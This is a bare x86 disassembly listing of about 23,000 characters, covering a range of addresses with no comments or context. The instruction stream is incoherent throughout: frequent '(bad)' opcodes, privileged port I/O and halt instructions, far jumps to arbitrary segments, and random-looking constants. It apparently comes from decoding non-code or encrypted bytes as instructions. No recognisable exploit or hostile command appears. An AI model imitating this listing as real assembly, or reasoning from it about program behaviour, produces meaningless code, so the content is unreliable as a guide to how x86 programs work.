  430fad:	push   0xacd0b641
  430fb2:	test   eax,0xc13ad51e
  430fb7:	das    
  430fb8:	jo     0x430f43
  430fba:	std    
  430fbb:	xor    eax,0xb4452d16
  430fc0:	mov    eax,ds:0x12f92e7c
  430fc5:	div    cl
  430fc7:	mov    ah,0xf7
  430fc9:	mov    bl,0xf3
  430fcb:	sbb    cl,bh
  430fcd:	lahf   
  430fce:	adc    al,0xd6
  430fd0:	mov    WORD PTR [ecx+0xc],cs
  430fd3:	lock and ah,BYTE PTR [eax]
  430fd6:	loope  0x430f9b
  430fd8:	push   ss
  430fd9:	addr16 stc 
  430fdb:	push   es
  430fdc:	xor    BYTE PTR [ebx+0xa],cl
  430fdf:	xchg   ebx,eax
  430fe0:	mov    al,ds:0xdac7e2b7
  430fe5:	retf   0x8240
  430fe8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430fe9:	fsubr  st,st(5)
  430feb:	mov    edi,?
  430fed:	fnstcw WORD PTR [esi-0x70]
  430ff0:	in     al,0x6b
  430ff2:	jne    0x430fff
  430ff4:	outs   dx,DWORD PTR ds:[esi]
  430ff5:	jge    0x430f81
  430ff7:	into   
  430ff8:	inc    eax
  430ffa:	mov    DWORD PTR [esp],0x7cd57ca6
  431001:	das    
  431002:	adc    al,0xaa
  431004:	mov    cl,0xcc
  431006:	push   ebp
  431007:	sahf   
  431008:	jbe    0x43104b
  43100a:	gs (bad) 
  43100c:	pop    ax
  43100e:	(bad)  
  43100f:	into   
  431010:	dec    ebx
  431011:	repnz cmp BYTE PTR [ecx],cl
  431014:	cmp    BYTE PTR [edx],al
  431016:	stos   BYTE PTR es:[edi],al
  431017:	rcr    BYTE PTR [ecx],1
  431019:	jne    0x43109a
  43101b:	xchg   edi,eax
  43101c:	push   0xffffffba
  43101e:	call   0xe8e4626
  431023:	cs cdq 
  431025:	sub    eax,0xe6e4f07
  43102a:	dec    ebx
  43102b:	mov    edx,DWORD PTR [ebx]
  43102d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43102e:	cs pop ebp
  431030:	and    BYTE PTR [edx-0xc],al
  431033:	xlat   BYTE PTR ds:[ebx]
  431034:	daa    
  431035:	out    0x72,eax
  431037:	and    BYTE PTR [ecx-0x1da2ddb7],0xdb
  43103e:	jo     0x430fff
  431040:	push   ebx
  431041:	add    ah,dl
  431043:	iret   
  431044:	and    BYTE PTR [eax+0xf],dl
  431047:	(bad)  
  431048:	and    DWORD PTR [eax],edx
  43104a:	xchg   edx,eax
  43104b:	jmp    0x430ff1
  43104d:	sahf   
  43104e:	cmp    al,0x1
  431050:	ins    DWORD PTR es:[edi],dx
  431051:	adc    eax,0x4312c627
  431056:	add    al,0x18
  431058:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431059:	pushf  
  43105a:	xor    esi,DWORD PTR [ecx-0x34]
  43105d:	cmp    eax,0x2904e646
  431062:	pop    ebp
  431063:	pushf  
  431064:	dec    eax
  431065:	mov    al,0xe
  431067:	jl     0x4310a1
  431069:	cmp    eax,0x68483964
  43106e:	inc    ebp
  43106f:	inc    ebp
  431070:	cs icebp 
  431072:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431073:	and    al,0xef
  431075:	ds xor bl,bl
  431078:	sub    ch,dl
  43107a:	sub    BYTE PTR [edi+0x3e],dh
  43107d:	xchg   esi,eax
  43107e:	shr    edi,1
  431080:	sbb    al,0x48
  431082:	mov    al,0xe1
  431084:	sahf   
  431085:	lods   eax,DWORD PTR ds:[esi]
  431086:	jg     0x431020
  431088:	aas    
  431089:	fidiv  WORD PTR [ecx+edi*1-0x66ebedf4]
  431090:	adc    ebp,DWORD PTR [ebp-0x1b989230]
  431096:	jmp    0x85b6:0xb24689bb
  43109d:	jp     0x431045
  43109f:	dec    esp
  4310a0:	mov    dh,0x34
  4310a2:	push   edx
  4310a3:	mov    al,ds:0x90090e40
  4310a8:	push   0x7e941335
  4310ad:	repnz mov eax,ds:0x6edbc545
  4310b3:	or     edx,ebp
  4310b5:	mov    eax,0xc9232b4
  4310ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4310bb:	mov    ebx,0x1b57464e
  4310c0:	adc    eax,0xdea05dbc
  4310c5:	into   
  4310c6:	inc    edi
  4310c7:	jp     0x431102
  4310c9:	add    al,0x5d
  4310cb:	mov    cl,0x31
  4310cd:	gs inc ebx
  4310cf:	mov    ebp,0x484ff844
  4310d4:	mov    ebp,0xee5ee379
  4310d9:	mov    dl,0xf7
  4310db:	out    dx,al
  4310dc:	hlt    
  4310dd:	push   es
  4310de:	in     al,dx
  4310df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4310e0:	mov    ebx,0xd47cde5f
  4310e5:	sub    ebx,DWORD PTR [eax]
  4310e7:	ds push esi
  4310e9:	xchg   ebx,eax
  4310ea:	(bad)  
  4310eb:	xlat   BYTE PTR ds:[ebx]
  4310ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4310ed:	ins    DWORD PTR es:[edi],dx
  4310ee:	fimul  DWORD PTR [edi]
  4310f0:	lds    edi,FWORD PTR ds:[ebx]
  4310f3:	xlat   BYTE PTR ds:[ebx]
  4310f4:	(bad)  
  4310f5:	lods   al,BYTE PTR ds:[esi]
  4310f6:	fdivr  QWORD PTR [eax+edi*1]
  4310f9:	fwait
  4310fa:	hlt    
  4310fb:	mov    ah,0x10
  4310fd:	xchg   edx,eax
  4310fe:	cmp    ch,al
  431100:	add    eax,0x7bef47a0
  431105:	ds jbe 0x4310ca
  431108:	or     eax,0x8d9d5f9b
  43110d:	into   
  43110e:	jae    0x431151
  431110:	xor    al,0x11
  431112:	enter  0x165d,0xad
  431116:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431117:	fwait
  431118:	ret    
  431119:	imul   ebx,DWORD PTR [ecx-0x7b],0xa1e6714f
  431120:	cld    
  431121:	or     eax,0xfce49f61
  431126:	push   eax
  431127:	int3   
  431128:	aam    0xf
  43112a:	mov    bh,0x6a
  43112c:	mov    ecx,0x588f00bd
  431131:	inc    esp
  431132:	rol    BYTE PTR [edx],1
  431134:	push   ebp
  431135:	imul   edx,DWORD PTR [edx+0x725c94fe],0x8fae2f82
  43113f:	xlat   BYTE PTR ds:[ebx]
  431140:	mov    gs,WORD PTR [edx]
  431142:	or     BYTE PTR [ecx+0x1d537e92],cl
  431148:	sub    esp,DWORD PTR [esi+0x65c74e89]
  43114e:	je     0x4311be
  431150:	mov    ebx,0xb32a8cb8
  431155:	dec    esp
  431156:	mov    ebx,DWORD PTR [esi+ebx*8]
  431159:	aad    0x36
  43115b:	sbb    DWORD PTR [ecx+0x3a1e7919],ebx
  431161:	stos   DWORD PTR es:[edi],eax
  431162:	mov    ds:0xedff4844,al
  431167:	add    al,0x82
  431169:	icebp  
  43116a:	ret    0xc18a
  43116d:	push   edi
  43116e:	mov    edx,0x1e8be043
  431173:	mov    eax,ds:0xb4430679
  431178:	inc    edi
  431179:	adc    eax,0xd40541c5
  43117e:	jmp    0x4311d3
  431180:	add    cl,bh
  431182:	cld    
  431183:	das    
  431184:	xchg   esp,eax
  431185:	inc    esp
  431186:	sbb    al,0x3b
  431188:	pminub mm0,QWORD PTR [ebx]
  43118b:	sbb    al,0x3b
  43118d:	dec    eax
  43118e:	or     al,0x22
  431190:	(bad)  
  431191:	in     al,dx
  431192:	or     DWORD PTR [ecx],esi
  431194:	daa    
  431195:	push   edi
  431196:	shl    DWORD PTR [ecx+0x57b4ee07],0xd5
  43119d:	mov    ebx,0xb5c4cf44
  4311a2:	mov    cl,0x93
  4311a4:	aam    0xa1
  4311a6:	je     0x431215
  4311a8:	pop    es
  4311a9:	jnp    0x431175
  4311ab:	scas   eax,DWORD PTR es:[edi]
  4311ac:	std    
  4311ad:	(bad)  
  4311af:	pop    fs
  4311b1:	pop    es
  4311b2:	mov    edx,0x465085b2
  4311b7:	repnz pop ds
  4311b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4311ba:	jmp    0xf083cfc6
  4311bf:	rcl    BYTE PTR [ecx+0x5e449600],cl
  4311c5:	sub    al,0x8d
  4311c7:	in     eax,0x15
  4311c9:	jmp    0xde7771a1
  4311ce:	cmc    
  4311cf:	ficomp WORD PTR [ebp-0x2c]
  4311d2:	mov    edi,0xe7dd9baf
  4311d7:	repz sub eax,0x628234d7
  4311dd:	scas   al,BYTE PTR es:[edi]
  4311de:	pop    eax
  4311df:	mov    ch,0x41
  4311e1:	loopne 0x431262
  4311e3:	ret    
  4311e4:	retw   0x850c
  4311e8:	arpl   WORD PTR [edx-0x69],sp
  4311eb:	inc    ebx
  4311ec:	loop   0x4311aa
  4311ee:	adc    ch,BYTE PTR [ebx+edi*2-0x42]
  4311f2:	or     ecx,esp
  4311f4:	mov    bl,0xf6
  4311f6:	jp     0x431239
  4311f8:	jae    0x431267
  4311fa:	lahf   
  4311fb:	sbb    esi,edx
  4311fd:	dec    esp
  4311fe:	imul   ecx
  431200:	xchg   esp,eax
  431201:	(bad)  
  431202:	xchg   ebx,eax
  431203:	add    al,0x6c
  431205:	sbb    eax,0x361a870a
  43120a:	push   ecx
  43120b:	or     eax,0x47bef574
  431210:	adc    cl,0x41
  431213:	and    dl,BYTE PTR ds:0xa6885bf6
  431219:	jns    0x4311d6
  43121b:	outs   dx,DWORD PTR ds:[esi]
  43121c:	mov    ebx,0xe00724a9
  431221:	mov    esi,0x19873490
  431226:	ins    DWORD PTR es:[edi],dx
  431227:	xchg   dx,ax
  431229:	ds pusha 
  43122b:	and    eax,DWORD PTR [esi-0x1b]
  43122e:	xor    BYTE PTR [edi+edi*1+0x15],bl
  431232:	clc    
  431233:	pushf  
  431234:	sub    BYTE PTR [esi+0x77],dl
  431237:	push   esi
  431238:	iret   
  431239:	xchg   ebx,eax
  43123a:	lds    esi,FWORD PTR [esi-0x53]
  43123d:	cwde   
  43123e:	add    bh,BYTE PTR [edx-0x328189d2]
  431244:	clc    
  431245:	je     0x431254
  431247:	in     eax,dx
  431248:	jecxz  0x431219
  43124a:	mov    edx,ebp
  43124c:	mov    cl,0x7
  43124e:	ret    
  43124f:	pop    esi
  431250:	mov    ch,0xe9
  431252:	inc    ecx
  431253:	jo     0x431215
  431255:	inc    eax
  431256:	pop    ebp
  431257:	rcl    BYTE PTR [ecx+ecx*2],1
  43125a:	mov    ebx,0xdab4e5
  43125f:	mov    bl,0x6a
  431261:	xchg   ebx,eax
  431262:	loope  0x431239
  431264:	mov    al,BYTE PTR [eax+0x49f5b562]
  43126a:	outs   dx,BYTE PTR ds:[esi]
  43126b:	cmp    BYTE PTR ds:0x2a5aa64,bl
  431271:	sbb    cl,BYTE PTR [edx+0x44]
  431274:	adc    eax,0x3ca11622
  431279:	test   DWORD PTR [esi+0x3c],0x563c5fa0
  431280:	cdq    
  431281:	mov    bl,BYTE PTR [edx]
  431283:	cmp    BYTE PTR [ecx-0x3f],0x35
  431287:	(bad)  
  431288:	and    dh,dl
  43128a:	push   0xdcd3c444
  43128f:	retf   
  431290:	test   edi,eax
  431292:	jge    0x43130d
  431294:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431295:	adc    DWORD PTR [esi+0x1d],esp
  431298:	adc    eax,0x1d45af1b
  43129d:	cmp    BYTE PTR [ebx+eax*1-0x66],0x42
  4312a2:	shl    edx,1
  4312a4:	adc    eax,0xa3523aec
  4312a9:	(bad)  [edx+0x4b]
  4312ac:	in     al,0x32
  4312ae:	xchg   bh,bh
  4312b0:	adc    DWORD PTR [edi+0x21],ebp
  4312b3:	push   ebx
  4312b4:	fist   DWORD PTR [ecx-0x69]
  4312b7:	call   0xb8d8:0x3d221628
  4312be:	push   ds
  4312bf:	mov    al,0x97
  4312c1:	rol    BYTE PTR [ebp-0x1],0xac
  4312c5:	lds    esp,FWORD PTR [ebx]
  4312c7:	lods   eax,DWORD PTR ds:[esi]
  4312c8:	shr    DWORD PTR ds:0xf9cd55ef,1
  4312ce:	inc    esi
  4312cf:	and    esi,DWORD PTR [eax+0x3a]
  4312d2:	inc    esp
  4312d3:	or     al,0x7e
  4312d5:	mov    edi,0xfa943950
  4312da:	sbb    BYTE PTR [eax],dl
  4312dc:	std    
  4312dd:	mov    eax,ds:0x342fba4b
  4312e2:	in     eax,0x50
  4312e4:	mov    gs,WORD PTR [edi]
  4312e6:	stos   BYTE PTR es:[edi],al
  4312e7:	cld    
  4312e8:	test   BYTE PTR [eax],al
  4312ea:	repz sbb ebp,DWORD PTR [ecx]
  4312ed:	fwait
  4312ee:	jno    0x43130b
  4312f0:	dec    esp
  4312f1:	(bad)  
  4312f3:	inc    edx
  4312f4:	xor    DWORD PTR [ecx],eax
  4312f6:	push   es
  4312f7:	push   ebp
  4312f8:	sub    edx,ebp
  4312fa:	pop    ss
  4312fb:	fwait
  4312fc:	clc    
  4312fd:	fist   WORD PTR [ecx+0x53c21267]
  431303:	lock mov eax,ds:0xe23030c9
  431309:	lds    eax,FWORD PTR [edi]
  43130b:	xchg   edi,eax
  43130c:	push   es
  43130d:	pop    edx
  43130e:	mov    dl,0x2b
  431310:	out    dx,al
  431311:	mov    ds:0x5eeab7f4,al
  431316:	scas   al,BYTE PTR es:[edi]
  431317:	pop    edi
  431318:	call   0xa862ca3c
  43131d:	xchg   ecx,eax
  43131e:	stos   DWORD PTR es:[edi],eax
  43131f:	ss dec ebp
  431321:	add    eax,0x22a2dc73
  431326:	das    
  431327:	enter  0x5be,0x39
  43132b:	addr16 addr16 aaa 
  43132e:	ret    0xb3c8
  431331:	or     dl,bl
  431333:	je     0x43132d
  431335:	jmp    0xdf98:0x980ba2f8
  43133c:	xor    ebx,DWORD PTR [eax-0x4723228b]
  431342:	stc    
  431343:	arpl   WORD PTR [edi-0x2842b531],dx
  431349:	sub    al,0xfe
  43134b:	add    DWORD PTR [ebx+0x2b0830d2],edi
  431351:	push   ss
  431352:	adc    eax,0x88c3532d
  431357:	stos   DWORD PTR es:[edi],eax
  431358:	nop
  431359:	xchg   ebp,eax
  43135a:	xchg   ecx,eax
  43135b:	ret    0x3fb2
  43135e:	ror    BYTE PTR [edi],0x9c
  431361:	mov    eax,DWORD PTR ds:0x7d3a3b1f
  431367:	ds sti 
  431369:	sti    
  43136a:	mov    ecx,DWORD PTR [edi]
  43136c:	and    DWORD PTR [ecx+0x61e70cbf],ebp
  431372:	jecxz  0x4313ba
  431374:	xor    ebp,DWORD PTR [ecx]
  431376:	jbe    0x431382
  431378:	daa    
  431379:	xor    bh,BYTE PTR [edx+edx*2+0x5]
  43137d:	leave  
  43137e:	mov    edx,0x854c5052
  431383:	rol    DWORD PTR [esi+ebx*8-0x6c],cl
  431387:	ins    DWORD PTR es:[edi],dx
  431388:	cmp    BYTE PTR [ebx-0x63],bl
  43138b:	cmc    
  43138c:	retf   
  43138d:	pop    ecx
  43138e:	xchg   ecx,eax
  43138f:	mov    edx,0x468492d8
  431394:	jbe    0x4313e5
  431396:	dec    edi
  431397:	jle    0x4313a2
  431399:	and    ebp,DWORD PTR [edi+0x5eddc662]
  43139f:	inc    eax
  4313a0:	push   eax
  4313a1:	add    eax,0x2a233040
  4313a6:	fst    QWORD PTR [edx+0x3f]
  4313a9:	jmp    0x6e45:0xa7e65e1c
  4313b0:	scas   al,BYTE PTR es:[edi]
  4313b1:	add    ch,BYTE PTR [esi-0x28df64f5]
  4313b7:	ror    BYTE PTR [ebx+eiz*2],1
  4313ba:	ds adc al,0x90
  4313bd:	add    BYTE PTR [ebx+0x21c1d3ce],0xab
  4313c4:	adc    eax,0x97138a7b
  4313c9:	pop    ebp
  4313ca:	leave  
  4313cb:	sbb    dl,dh
  4313cd:	and    DWORD PTR [ebx+0x44b72ec6],esp
  4313d3:	js     0x43137c
  4313d5:	clc    
  4313d6:	mov    dl,ch
  4313d8:	pop    edi
  4313d9:	leave  
  4313da:	sub    BYTE PTR [eax],ch
  4313dc:	cli    
  4313dd:	or     edi,DWORD PTR [ecx+0x3ad59a0e]
  4313e3:	pop    ecx
  4313e4:	add    cl,BYTE PTR [esi+edx*2]
  4313e7:	xor    bh,dl
  4313e9:	sub    BYTE PTR [ecx],ch
  4313eb:	stc    
  4313ec:	out    0xb2,eax
  4313ee:	icebp  
  4313ef:	arpl   WORD PTR [ebx+0x334c0a69],bx
  4313f5:	pushf  
  4313f6:	jp     0x43143d
  4313f8:	and    BYTE PTR [ecx+0x59],ch
  4313fb:	lahf   
  4313fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4313fd:	out    0x11,al
  4313ff:	mov    eax,ds:0xad23f688
  431404:	(bad)  
  431405:	(bad)  
  431406:	pop    ebx
  431407:	mov    ah,0x98
  431409:	dec    ebp
  43140a:	adc    esi,0x2928f7f3
  431410:	nop
  431411:	hlt    
  431412:	pusha  
  431413:	fisttp DWORD PTR [eax-0x492c7ae1]
  431419:	mov    ds,ebp
  43141b:	pop    ss
  43141c:	(bad)  
  43141d:	icebp  
  43141e:	sbb    ch,al
  431420:	xor    esp,DWORD PTR [esi-0x5b]
  431423:	adc    al,0x6
  431425:	mov    bl,0x25
  431427:	in     eax,dx
  431428:	pop    ecx
  431429:	nop
  43142a:	add    bl,BYTE PTR [ebx+0x2a]
  43142d:	outs   dx,DWORD PTR ds:[esi]
  43142e:	mov    al,0x42
  431430:	ret    
  431431:	call   0x1edd:0xb494ab82
  431438:	repnz pop eax
  43143a:	test   al,0xc8
  43143c:	cmp    eax,0xf6390c7e
  431441:	xchg   ebx,eax
  431442:	push   ecx
  431443:	mov    dl,0x96
  431445:	xchg   ebx,eax
  431446:	push   ecx
  431447:	cdq    
  431448:	pusha  
  431449:	push   eax
  43144b:	xor    esp,DWORD PTR [ecx-0x3e]
  43144e:	jne    0x431474
  431450:	ficom  WORD PTR [edi]
  431452:	ret    
  431453:	mov    eax,0xe8fafa16
  431458:	jb     0x43144e
  43145a:	frstor [eax+0x7a1233c]
  431460:	loop   0x4314d0
  431462:	jecxz  0x43141f
  431464:	dec    edi
  431465:	xor    al,BYTE PTR [ebx-0x355cfae5]
  43146b:	mov    eax,0xb4fa57ff
  431470:	xor    DWORD PTR [ebp+0x2a5e5773],ebx
  431476:	mov    eax,esp
  431478:	scas   eax,DWORD PTR es:[edi]
  431479:	xchg   edx,eax
  43147a:	push   eax
  43147b:	inc    esp
  43147c:	sbb    DWORD PTR [esi],eax
  43147e:	fst    QWORD PTR [eax+0x20]
  431481:	xor    dl,bh
  431483:	or     al,0xfe
  431485:	jle    0x431482
  431487:	sti    
  431488:	sahf   
  431489:	xchg   edx,eax
  43148a:	int    0xea
  43148c:	sahf   
  43148d:	in     al,dx
  43148e:	repz fadd DWORD PTR [eax+ebx*2+0x206fec4a]
  431496:	dec    esp
  431497:	pop    edi
  431498:	scas   eax,DWORD PTR es:[edi]
  431499:	dec    ebx
  43149b:	xor    al,0xe8
  43149d:	adc    esp,DWORD PTR [edi-0x25bcf41a]
  4314a3:	pop    ss
  4314a4:	cld    
  4314a5:	into   
  4314a6:	pop    ds
  4314a7:	addr16 loopne 0x431520
  4314aa:	out    dx,al
  4314ab:	push   esi
  4314ac:	out    0x2b,al
  4314ae:	xor    al,0x53
  4314b0:	mov    esp,DWORD PTR [ebx-0x4c]
  4314b3:	jo     0x4314d8
  4314b5:	mov    bh,0xcb
  4314b7:	mov    ch,0x92
  4314b9:	pop    edx
  4314ba:	call   0xb93f6fe2
  4314bf:	adc    cl,ch
  4314c1:	inc    esp
  4314c2:	(bad)  
  4314c3:	and    BYTE PTR ds:0xdaa57576,cl
  4314c9:	pusha  
  4314ca:	aaa    
  4314cb:	mov    ebx,0x19938294
  4314d0:	int3   
  4314d1:	mov    ds:0xf71233a3,al
  4314d6:	push   ds
  4314d7:	pop    esp
  4314d8:	stos   BYTE PTR es:[edi],al
  4314d9:	scas   eax,DWORD PTR es:[edi]
  4314da:	sti    
  4314db:	xchg   DWORD PTR [edi],ebp
  4314dd:	adc    eax,esi
  4314df:	or     dl,BYTE PTR [edi-0x25]
  4314e2:	loope  0x4314bd
  4314e4:	xchg   edi,eax
  4314e5:	ss adc eax,0x76572144
  4314eb:	or     al,0x1f
  4314ee:	cmp    cl,BYTE PTR [edx]
  4314f0:	xor    BYTE PTR [ebp+ebx*1-0x60326f56],cl
  4314f7:	lds    edx,FWORD PTR [edi]
  4314f9:	mov    ds:0xca22a1aa,eax
  4314fe:	sub    al,0x1e
  431500:	(bad)  
  431501:	or     ecx,DWORD PTR [edx-0x5dba6615]
  431507:	mov    ah,0xe1
  431509:	adc    DWORD PTR [esp+ecx*2+0x1c],ebp
  43150d:	leave  
  43150e:	sbb    BYTE PTR [ecx],dh
  431510:	add    eax,0x8641f7c6
  431515:	jae    0x43155c
  431517:	call   0x7337:0x4f461775
  43151e:	rcr    DWORD PTR [esi-0x3b322249],cl
  431524:	add    DWORD PTR [edi+0x17],edx
  431527:	xchg   esp,eax
  431528:	fmul   DWORD PTR [ecx-0x344c7472]
  43152e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43152f:	sub    BYTE PTR [ebx],ch
  431531:	jb     0x431505
  431533:	adc    eax,0xf6ead13f
  431538:	(bad)  
  431539:	sbb    eax,0x76e0689e
  43153e:	push   ebx
  43153f:	arpl   WORD PTR [eax],bp
  431541:	push   es
  431542:	clc    
  431543:	sub    bl,BYTE PTR [ebp-0xc618bcc]
  431549:	mov    al,0xfa
  43154b:	ss or  eax,0x80a9c7f6
  431551:	xchg   dl,dh
  431553:	xor    ch,BYTE PTR [edx]
  431555:	xchg   esi,eax
  431556:	fcom   st(0)
  431558:	pop    edx
  431559:	iret   
  43155a:	xchg   ebx,eax
  43155b:	fwait
  43155c:	xor    BYTE PTR [edi+0x10c20161],al
  431562:	call   0xea10:0x7b9cf483
  431569:	push   0x3f
  43156b:	daa    
  43156c:	aas    
  43156d:	int    0xde
  43156f:	test   ebp,ebp
  431571:	sub    DWORD PTR fs:[edx-0x40201bb],ecx
  431578:	inc    edx
  431579:	fidivr WORD PTR [esi+0x23bee597]
  43157f:	stos   BYTE PTR es:[edi],al
  431580:	cdq    
  431581:	push   ecx
  431582:	or     ch,BYTE PTR [ecx+0x7b]
  431585:	js     0x4315b6
  431587:	clc    
  431588:	adc    eax,0xf8c1f76b
  43158d:	cmp    ebp,edx
  43158f:	cli    
  431590:	xor    al,0xf7
  431592:	adc    dh,BYTE PTR [edi]
  431594:	push   edi
  431595:	push   edx
  431596:	bound  eax,QWORD PTR [edi]
  431598:	aas    
  431599:	jo     0x431581
  43159b:	mov    WORD PTR [ebp-0x72c9b97],?
  4315a1:	lock out dx,eax
  4315a3:	mov    ds:0x129fbe91,al
  4315a8:	mov    ds:0x8b70d399,al
  4315ad:	call   0xd14c4d7c
  4315b2:	clc    
  4315b3:	pushf  
  4315b4:	jl     0x43156a
  4315b6:	xor    ecx,DWORD PTR [esi+0x300b6733]
  4315bc:	dec    esi
  4315bd:	cmp    DWORD PTR [ebp-0x65],esp
  4315c0:	inc    ebp
  4315c1:	lock dec ebp
  4315c3:	das    
  4315c4:	aaa    
  4315c5:	cmc    
  4315c6:	push   eax
  4315c7:	out    0x2c,al
  4315c9:	xchg   edi,esi
  4315cb:	xchg   ebx,eax
  4315cc:	xor    dh,dl
  4315ce:	cmp    ebx,DWORD PTR [esi]
  4315d0:	in     al,0x4d
  4315d2:	and    BYTE PTR [ecx],cl
  4315d4:	push   ss
  4315d5:	mov    dl,0x25
  4315d7:	gs mov ebp,0xcfb06cb8
  4315dd:	mov    ecx,0x84cd95df
  4315e2:	dec    ebp
  4315e3:	aad    0x3f
  4315e5:	addr16 call 0x14def1ab
  4315eb:	inc    ebx
  4315ec:	push   ebx
  4315ed:	dec    esi
  4315ee:	test   BYTE PTR [ebx],ch
  4315f0:	loopne 0x431639
  4315f2:	je     0x431673
  4315f4:	mov    gs,WORD PTR [edi+ebp*8-0x9]
  4315f8:	std    
  4315f9:	mov    cl,0xa7
  4315fb:	dec    esi
  4315fc:	or     eax,0x6f1201b4
  431601:	sti    
  431602:	add    dh,BYTE PTR [edi+eax*2-0x1c]
  431606:	sbb    ebp,DWORD PTR ds:[ecx]
  431609:	push   eax
  43160a:	mov    bl,0x49
  43160c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43160d:	pushf  
  43160e:	fs pop ss
  431610:	sub    al,0x31
  431612:	add    DWORD PTR [ebx-0x71],esi
  431615:	cmp    DWORD PTR [esi+esi*4],esi
  431618:	xchg   sp,ax
  43161a:	inc    edi
  43161b:	sahf   
  43161c:	shl    BYTE PTR [edi-0x6eed04ff],0x97
  431623:	adc    bl,bh
  431625:	out    0x3b,al
  431627:	adc    esi,DWORD PTR [esi]
  431629:	pop    edx
  43162a:	cld    
  43162b:	xor    bh,ch
  43162d:	jmp    0x4315ef
  43162f:	shl    DWORD PTR [ebx-0x42],1
  431632:	fs adc dh,cl
  431635:	adc    al,0x82
  431637:	adc    edx,ebp
  431639:	adc    ebp,DWORD PTR [esi+eax*4+0x15]
  43163d:	(bad)  
  43163e:	push   eax
  43163f:	repnz stc 
  431641:	ret    0x4d9b
  431644:	and    edx,edx
  431646:	call   0x531e:0x78dd0dde
  43164d:	imul   esi,DWORD PTR [edx+0x7d],0xade204d1
  431654:	or     eax,0x5189bba7
  431659:	push   0xffffffa0
  43165b:	ss sti 
  43165d:	pop    ebx
  43165e:	and    al,al
  431660:	push   0x48
  431662:	pop    ebp
  431663:	gs out 0x96,eax
  431666:	jae    0x43166d
  431668:	add    BYTE PTR [ebx+0x108965a9],ch
  43166e:	xchg   ebx,eax
  43166f:	cld    
  431670:	mov    ds:0x87c82cb1,al
  431675:	pop    ecx
  431676:	dec    DWORD PTR [esp+eax*4-0x63b9da93]
  43167d:	arpl   WORD PTR [edx-0x3c65a800],cx
  431683:	xchg   BYTE PTR [esi+0x49ba6b66],al
  431689:	mov    ecx,0x79ebadc4
  43168e:	and    BYTE PTR [ebx-0x41931631],dh
  431694:	(bad)  
  431695:	test   eax,0x3da10f45
  43169a:	mov    ch,0xae
  43169c:	mov    WORD PTR [edi],ss
  43169e:	dec    esp
  43169f:	sub    BYTE PTR [esi+ebp*8+0x5a4c931b],ch
  4316a6:	push   cs
  4316a7:	mov    eax,0x7b7a983d
  4316ac:	xor    BYTE PTR [edx+eax*1+0x22],ah
  4316b0:	retf   
  4316b1:	adc    esi,DWORD PTR [ebp-0x10ceb798]
  4316b7:	test   eax,0x39c7c142
  4316bc:	sbb    eax,0xe2b3bc76
  4316c1:	jno    0x4316af
  4316c3:	mov    eax,0x2e17464c
  4316c8:	adc    DWORD PTR [edi-0x6c],edx
  4316cb:	cmp    al,0x21
  4316cd:	xchg   edi,eax
  4316ce:	scas   al,BYTE PTR es:[edi]
  4316cf:	pop    esi
  4316d0:	mov    dl,0xe
  4316d2:	in     eax,0xb8
  4316d4:	jmp    0x43174c
  4316d6:	lea    ecx,[esi+0x32cd42b4]
  4316dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4316de:	mov    ebp,0x44434cbd
  4316e3:	outs   dx,BYTE PTR ds:[esi]
  4316e4:	dec    ecx
  4316e5:	push   edi
  4316e6:	ror    BYTE PTR [edi+ebp*1-0x7f],cl
  4316ea:	sti    
  4316eb:	sti    
  4316ec:	xchg   ebp,eax
  4316ed:	ret    
  4316ee:	in     eax,0x7a
  4316f0:	jno    0x43174e
  4316f2:	frstor [ecx]
  4316f4:	call   0xf2808202
  4316f9:	ror    BYTE PTR gs:[ebx+0xa33e5ad],0xa0
  431701:	pushf  
  431702:	push   edi
  431703:	scas   eax,DWORD PTR es:[edi]
  431704:	adc    al,0x71
  431706:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431707:	dec    edx
  431708:	outs   dx,DWORD PTR ds:[esi]
  431709:	ins    BYTE PTR es:[edi],dx
  43170a:	mov    ds:0x8e33b0cc,al
  43170f:	mov    al,ds:0x2311ce32
  431714:	mov    DWORD PTR [ebp-0x54],0x44388024
  43171b:	mov    al,0xdf
  43171e:	loop   0x431712
  431720:	mov    ds:0xd1353312,eax
  431725:	jmp    0x43174a
  431727:	lods   eax,DWORD PTR ds:[esi]
  431728:	xchg   ebp,eax
  431729:	std    
  43172a:	lahf   
  43172b:	hlt    
  43172c:	(bad)  
  43172d:	mov    esp,0x5af453ab
  431732:	lods   al,BYTE PTR ds:[esi]
  431733:	leave  
  431734:	mov    al,ds:0x11a77563
  431739:	mov    esi,0x63e80632
  43173e:	pop    es
  43173f:	jae    0x431727
  431741:	(bad)  
  431742:	fcmovnu st,st(7)
  431744:	push   edx
  431745:	adc    bl,BYTE PTR [eax+0x3654918]
  43174b:	sub    ebp,DWORD PTR [esi+esi*8+0x15af5e52]
  431752:	mov    eax,DWORD PTR [eax-0x1b]
  431755:	(bad)  
  431756:	fiadd  WORD PTR [ebp-0x71]
  431759:	lea    ecx,[eax+ecx*8]
  43175c:	sbb    edx,DWORD PTR [edi]
  43175e:	cwde   
  43175f:	bnd ret 
  431761:	push   esp
  431762:	fucomi st,st(0)
  431764:	pop    edi
  431765:	test   al,0x6d
  431767:	or     eax,0x6a54f7b2
  43176c:	arpl   dx,ax
  43176e:	(bad)  
  43176f:	(bad)  
  431770:	inc    ecx
  431771:	retf   0xc7e4
  431774:	scas   eax,DWORD PTR es:[edi]
  431775:	add    edi,DWORD PTR [edi+edx*2-0x1]
  431779:	cli    
  43177a:	sub    ebp,esp
  43177c:	mov    ss,WORD PTR [ebx]
  43177e:	outs   dx,DWORD PTR ds:[esi]
  43177f:	jp     0x4317c8
  431781:	jmp    0xdfbb4487
  431786:	adc    BYTE PTR [ecx],bl
  431788:	and    edi,ecx
